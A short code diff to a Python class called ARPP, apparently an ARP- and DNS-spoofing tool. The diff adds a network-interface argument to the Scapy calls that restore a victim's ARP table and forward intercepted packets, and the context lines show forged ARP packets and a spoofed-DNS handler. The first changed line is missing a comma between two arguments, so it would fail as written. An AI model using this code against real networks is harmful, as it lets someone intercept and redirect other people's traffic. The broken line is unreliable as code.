@@ -365,7 +365,7 @@ class ARPP(object):
                         print("[i] Healing ARP table...")
                         macOfSpoofedIp = self._get_mac_from_ip(ipToSpoof)
                         packet = Ether(src=macOfSpoofedIp)/ARP(hwsrc=macOfSpoofedIp, psrc=ipToSpoof, hwdst=macVictim, pdst=ipVictim)
-                        sendp( packet )
+                        sendp( packet, iface=self.SELECTED_INTERFACE verbose=False )
                     except:
                         pass
                     break
@@ -484,7 +484,7 @@ class ARPP(object):
                 return "Responding to {}".format(pkt[IP].src)
             
             def forward_packet(pkt):
-                sendp(pkt, verbose=0)
+                sendp(pkt, iface=self.SELECTED_INTERFACE, verbose=0)
 
             def send_spoofed_response(packet):
                 # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
